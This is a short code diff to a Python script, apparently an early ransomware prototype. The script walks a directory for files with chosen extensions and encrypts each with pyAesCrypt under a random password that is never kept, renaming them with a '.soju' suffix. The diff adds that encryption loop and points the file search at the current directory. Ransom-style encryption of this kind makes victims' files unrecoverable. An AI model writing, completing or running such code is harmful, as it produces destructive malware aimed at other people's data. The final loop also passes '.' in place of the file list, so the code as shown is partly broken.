@@ -16,10 +16,12 @@ def walk(drive, extensions):
     return target_file
 
 def encrypt(files):
-    buffersize = 64*1024
+    bufferSize = 64*1024
     password = ''.join(random.choices(string.ascii_letters + string.digits + "/?!@#$%^&*()-=+", k=24))
 
-        
+    for file in files:
+        encFile = file + ".soju"
+        pyAesCrypt.encryptFile(file, encFile, password, bufferSize)
 
 def main():
     print ("="*50)
@@ -28,8 +30,9 @@ def main():
     extensions = (".cnf",".tar")
 
     # Getting All Target Files...
-    #target_file = walk('/', extensions)
-    #print ("[DEBUG] [+] List of targeted files\n", target_file)
+    starting_path = "."
+    target_file = walk(starting_path, extensions)
+    print ("[DEBUG] [+] List of targeted files\n", target_file)
 
     for i in range(0,100):
         encrypt('.')
